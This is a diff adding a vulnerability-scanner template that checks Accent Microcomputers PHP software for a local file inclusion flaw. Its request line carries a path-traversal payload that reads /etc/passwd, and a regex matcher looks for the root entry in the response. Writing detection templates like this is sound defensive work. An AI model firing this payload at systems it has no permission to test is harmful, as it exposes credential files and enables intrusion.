@@ -1,0 +1,28 @@
+id: "accent-microcomputers-lfi"
+name: "Accent Microcomputers LFI"
+severity: "high"
+description: "A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve password files."
+tech:
+  - "php"
+tags:
+  - "microcomputers"
+  - "accent"
+  - "lfi"
+  - "vuln"
+reference: "https://cxsecurity.com/issue/WLB-2018050036"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/index.php?id=50&file=../../../../../../../../../etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:[x*]:0:0"
+  - type: "status"
+    status:
+      - 200
